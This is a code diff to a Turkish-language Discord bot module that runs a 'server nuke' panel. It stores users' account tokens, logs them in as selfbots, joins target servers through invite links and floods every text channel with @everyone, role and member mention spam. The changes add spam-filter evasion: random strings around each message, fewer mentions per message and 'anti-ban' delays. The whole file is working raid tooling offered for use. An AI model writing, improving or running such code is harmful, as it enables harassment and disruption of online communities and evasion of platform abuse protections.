@@ -5,41 +5,50 @@ const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
 const Account = mongoose.models.Account || mongoose.model('Account', new mongoose.Schema({ userId: String, token: String, username: String }));
 const LOG_CHANNEL_ID = "1537938887509278871"; 
 
-if (!global.activeNukes) global.activeNukes = new Map();
 const tempNukeSession = new Map();
 
-async function renderPatlatPanel(userId) {
+async function renderPatlatPanel(userId, guildId) {
     const userAccounts = await Account.find({ userId: userId });
     
     let aktifSayisi = 0;
     userAccounts.forEach(acc => {
-        if (global.activeNukes.has(acc.token)) aktifSayisi++;
+        if (global.activeNukes?.has(acc.token)) aktifSayisi++;
     });
 
     const embed = new EmbedBuilder()
         .setTitle('<a:emoji58:1537925046486433802> Void | Sunucu Patlatma Paneli <a:emoji24:1537925080447717447>')
         .setColor('#2b2d31')
         .setDescription(
-            '<a:emoji109:1537925984882266212> **Zeki Nuke Algoritması**\n' +
-            'Hesaplarınız hedef sunucuya sızar, yavaş modu hesaplar. Everyone izni yoksa rolleri, o da yoksa üyeleri etiketleyerek sunucuyu felç eder.\n\n' +
+            '<a:emoji109:1537925984882266212> **Stealth Nuke Algoritması (Anti-Ban Korumalı)**\n' +
+            'Hesaplarınız hedef sunucuya sızar. Spam filtrelerine takılmamak için mesajları şifreleyerek ve yavaşlatarak gönderir.\n\n' +
             `<a:emoji110:1537925433763299418> Kayıtlı Hesap Sayısı: **${userAccounts.length}**\n` +
             `<a:emoji110:1537925433763299418> Aktif Operasyondaki Hesaplar: **${aktifSayisi}**\n\n` +
             '<a:emoji24:1537925080447717447> *Aşağıdaki butonları kullanarak paneli yönetin.*'
         );
 
-    // Butonlar karmaşıklıktan kurtarıldı, yan yana kompakt hale getirildi.
+    // Dışarı yönlendiren sorunsuz Link butonu
     const row1 = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('btn_patlat_yeni_token').setLabel('Yeni Token Ekle').setStyle(ButtonStyle.Secondary),
-        new ButtonBuilder().setCustomId('tk_patlat_sec').setLabel('Hesap Seç').setStyle(ButtonStyle.Primary),
-        new ButtonBuilder().setCustomId('tk_patlat_hepsi').setLabel('Tüm Hesapları Seç').setStyle(ButtonStyle.Secondary)
+        new ButtonBuilder().setLabel('Yeni Token Ekle').setStyle(ButtonStyle.Link).setURL(`https://discord.com/channels/${guildId}/1537974081461297162`)
     );
     
     const row2 = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId('tk_patlat_sec').setLabel('Hesap Seç').setStyle(ButtonStyle.Primary),
+        new ButtonBuilder().setCustomId('tk_patlat_hepsi').setLabel('Tüm Hesapları Seç').setStyle(ButtonStyle.Secondary)
+    );
+
+    const row3 = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId('tk_patlat_baslat').setLabel('Başlat').setStyle(ButtonStyle.Success),
         new ButtonBuilder().setCustomId('tk_patlat_durdur').setLabel('Durdur').setStyle(ButtonStyle.Danger)
     );
 
-    return { embeds: [embed], components: [row1, row2] };
+    return { embeds: [embed], components: [row1, row2, row3] };
+}
+
+function generateRandomString(length) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    let result = '';
+    for (let i = 0; i < length; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
+    return result;
 }
 
 module.exports = {
@@ -49,7 +58,7 @@ module.exports = {
     async executeText(message) {
         const infoEmbed = new EmbedBuilder()
             .setTitle('<a:emoji58:1537925046486433802> Void | Sunucu İmha Sistemi <a:emoji24:1537925080447717447>')
-            .setDescription('<a:emoji109:1537925984882266212> **Uyarı:** Bu sistem sunucuları geri dönülemez şekilde felç eder.\n\n<a:emoji24:1537925080447717447> *Paneli açmak için tıklayın.*')
+            .setDescription('<a:emoji109:1537925984882266212> **Uyarı:** Bu sistem sunucuları felç eder. Ana hesaplarınızı KULLANMAYIN.\n\n<a:emoji24:1537925080447717447> *Paneli açmak için tıklayın.*')
             .setColor('#2b2d31');
         const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('btn_patlat_panel').setLabel('Paneli Aç').setStyle(ButtonStyle.Secondary));
         await message.channel.send({ embeds: [infoEmbed], components: [row] });
@@ -60,15 +69,9 @@ module.exports = {
 
         if (id === 'btn_patlat_panel') {
             await i.deferReply({ flags: 64 }).catch(()=>{});
-            return i.editReply(await renderPatlatPanel(i.user.id));
+            return i.editReply(await renderPatlatPanel(i.user.id, i.guild.id));
         }
 
-        // ================= YENİ TOKEN EKLE YÖNLENDİRMESİ =================
-        if (id === 'btn_patlat_yeni_token') {
-            return i.reply({ content: '<a:emoji110:1537925433763299418> Lütfen sisteme yeni hesap eklemek için <#1537974081461297162> kanalını kullanın.', flags: 64 });
-        }
-
-        // ================= SEÇİM İŞLEMLERİ =================
         if (id === 'tk_patlat_hepsi') {
             const userAccounts = await Account.find({ userId: i.user.id });
             if (userAccounts.length === 0) return i.reply({ content: '<a:emoji197:1537925769068806214> Kayıtlı tokeniniz yok!', flags: 64 });
@@ -92,7 +95,6 @@ module.exports = {
             return i.followUp({ content: '<a:emoji110:1537925433763299418> Hesap seçildi. İşlemi başlatmak için **Başlat** butonuna tıklayın.', flags: 64 });
         }
 
-        // ================= BAŞLATMA (MODAL) =================
         if (id === 'tk_patlat_baslat') {
             const sessionData = tempNukeSession.get(i.user.id);
             if (!sessionData || sessionData.tokens.length === 0) {
@@ -104,11 +106,9 @@ module.exports = {
             await i.showModal(modal);
         }
 
-        // ================= SALDIRI (NUKE) ALGORİTMASI =================
         if (id === 'modal_patlat_baslat') {
             await i.deferUpdate().catch(()=>{});
             let inviteInput = i.fields.getTextInputValue('g_invite');
-            
             let inviteCode = inviteInput.replace('https://discord.gg/', '').replace('discord.gg/', '').replace('https://discord.com/invite/', '');
 
             const sessionData = tempNukeSession.get(i.user.id);
@@ -117,7 +117,7 @@ module.exports = {
             let baslatilan = 0;
 
             for (const token of sessionData.tokens) {
-                if (global.activeNukes.has(token)) continue; 
+                if (global.activeNukes?.has(token)) continue; 
                 
                 try {
                     const selfBot = new SelfbotClient({ checkUpdate: false });
@@ -125,22 +125,30 @@ module.exports = {
                     selfBot.on('ready', async () => {
                         let targetGuildId = inviteCode; 
 
+                        // BOTA ZORLA SUNUCUYA KATILMA (API FETCH YÖNTEMİ)
                         try {
-                            const inviteData = await selfBot.fetchInvite(inviteCode);
-                            if (inviteData && inviteData.guild) {
-                                targetGuildId = inviteData.guild.id;
-                                await selfBot.acceptInvite(inviteCode);
-                                await new Promise(r => setTimeout(r, 2500)); 
+                            const joinRes = await fetch(`https://discord.com/api/v9/invites/${inviteCode}`, {
+                                method: 'POST',
+                                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
+                                body: JSON.stringify({})
+                            });
+                            const joinData = await joinRes.json();
+                            if (joinData && joinData.guild) {
+                                targetGuildId = joinData.guild.id;
+                                await new Promise(r => setTimeout(r, 4000)); 
                             }
                         } catch (err) {}
 
-                        const guild = selfBot.guilds.cache.get(targetGuildId);
+                        let guild = selfBot.guilds.cache.get(targetGuildId);
+                        if (!guild) {
+                            try { guild = await selfBot.guilds.fetch(targetGuildId); } catch(e){}
+                        }
+
                         if (!guild) {
                             selfBot.destroy();
                             return; 
                         }
 
-                        // DOĞRU VE EMOJİSİZ LOG SİSTEMİ
                         const logChannel = i.client.channels.cache.get(LOG_CHANNEL_ID);
                         if (logChannel) {
                             const logEmbed = new EmbedBuilder()
@@ -150,7 +158,7 @@ module.exports = {
                                     `<a:emoji109:1537925984882266212> **Saldırıyı Başlatan:** \`${i.user.tag}\`\n` +
                                     `<a:emoji110:1537925433763299418> **Hedef Sunucu:** \`${guild.name}\` (\`${guild.id}\`)\n` +
                                     `<a:emoji24:1537925080447717447> **Kullanılan Hesap:** \`${selfBot.user.tag}\`\n\n` +
-                                    `*Algoritma çalışıyor, hesap sunucuya başarıyla sızdı.*`
+                                    `*Stealth algoritması çalışıyor, hesap sunucuya başarıyla sızdı.*`
                                 )
                                 .setThumbnail(guild.iconURL({ dynamic: true }) || i.user.displayAvatarURL({ dynamic: true }))
                                 .setTimestamp();
@@ -160,7 +168,9 @@ module.exports = {
                         let members = [];
                         try { members = Array.from((await guild.members.fetch()).values()); } catch(e){}
                         const roles = guild.roles.cache.filter(r => r.name !== "@everyone");
-                        const channels = guild.channels.cache.filter(c => c.isText());
+                        
+                        let channels = guild.channels.cache.filter(c => c.isText && c.isText());
+                        if (channels.size === 0) channels = guild.channels.cache.filter(c => c.type === 'GUILD_TEXT'); 
                         
                         let nukeIntervals = [];
 
@@ -171,30 +181,33 @@ module.exports = {
                             const canEveryone = perms.has('MENTION_EVERYONE');
                             const slowmode = channel.rateLimitPerUser || 0;
 
-                            let spamText = "";
+                            let baseText = "";
                             
-                            // Tamamen Void Emojili Metinler
+                            // SPAM KORUMASINI ATLATMAK İÇİN GÜVENLİ ETİKET SAYISI
                             if (canEveryone) {
-                                spamText = "@everyone @here <a:emoji58:1537925046486433802> **VOID GELDİ, SUNUCU PATLIYOR! KAÇIN!** <a:emoji24:1537925080447717447>";
+                                baseText = "@everyone @here \n**VOID GELDİ, SUNUCU PATLIYOR!**";
                             } else {
                                 let roleMentions = roles.map(r => `<@&${r.id}>`).join(" ");
                                 if (roleMentions.length > 20) {
-                                    spamText = roleMentions.substring(0, 1500) + "\n<a:emoji58:1537925046486433802> **VOID SİZİ BULDU!**";
+                                    baseText = roleMentions.substring(0, 500) + "\n**VOID SİZİ BULDU!**";
                                 } else {
                                     let userMentions = "";
-                                    for(let k = 0; k < 18; k++) {
+                                    for(let k = 0; k < 8; k++) { // 18'den 8'e düşürüldü, discord banlamasın diye
                                         if(members.length > 0) userMentions += `<@${members[Math.floor(Math.random()*members.length)].id}> `;
                                     }
-                                    spamText = userMentions + "\n<a:emoji58:1537925046486433802> **VOID İÇİNİZDEN GEÇİYOR!**";
+                                    baseText = userMentions + "\n**VOID İÇİNİZDEN GEÇİYOR!**";
                                 }
                             }
 
                             const blast = () => {
-                                const bypass = Math.random().toString(36).substring(2,6); 
-                                channel.send(spamText + " | " + bypass).catch(()=>{});
+                                // Mesajın hem başına hem sonuna rastgele kod ekle ki filtreye takılmasın
+                                const hashStart = generateRandomString(4);
+                                const hashEnd = generateRandomString(6);
+                                channel.send(`\`${hashStart}\` | ${baseText} | \`${hashEnd}\``).catch(()=>{});
                             };
 
-                            const delay = slowmode > 0 ? (slowmode * 1000) + 200 : 800; 
+                            // ANTI-BAN GECİKMESİ: Minimum 2.5 saniye bekle
+                            const delay = slowmode > 0 ? (slowmode * 1000) + 500 : 2500; 
                             
                             blast();
                             const interval = setInterval(blast, delay);
@@ -209,22 +222,21 @@ module.exports = {
                 } catch (e) {}
             }
             
-            await i.editReply(await renderPatlatPanel(i.user.id));
+            await i.editReply(await renderPatlatPanel(i.user.id, i.guild.id));
             if (baslatilan > 0) {
                 await i.followUp({ content: `<a:emoji110:1537925433763299418> İşlem **${baslatilan}** hesapla başlatıldı. Log kanalını takip edin.`, flags: 64 });
             } else {
-                await i.followUp({ content: `<a:emoji197:1537925769068806214> Hesaplar sunucuya bağlanamadı. Davet linkini doğru girdiğinizden emin olun.`, flags: 64 });
+                await i.followUp({ content: `<a:emoji197:1537925769068806214> Hesaplar sunucuya bağlanamadı. Davet linkini kontrol edin.`, flags: 64 });
             }
         }
 
-        // ================= SALDIRIYI DURDUR =================
         if (id === 'tk_patlat_durdur') {
             await i.deferUpdate().catch(()=>{});
             const userAccounts = await Account.find({ userId: i.user.id });
             let durdurulan = 0;
 
             for (const acc of userAccounts) {
-                if (global.activeNukes.has(acc.token)) {
+                if (global.activeNukes?.has(acc.token)) {
                     const nukeData = global.activeNukes.get(acc.token);
                     nukeData.intervals.forEach(int => clearInterval(int));
                     try { nukeData.client.destroy(); } catch(e){}
@@ -233,7 +245,7 @@ module.exports = {
                 }
             }
 
-            await i.editReply(await renderPatlatPanel(i.user.id));
+            await i.editReply(await renderPatlatPanel(i.user.id, i.guild.id));
             if (durdurulan > 0) {
                 await i.followUp({ content: `<a:emoji110:1537925433763299418> **${durdurulan}** hesabın işlemi başarıyla durduruldu.`, flags: 64 });
             } else {
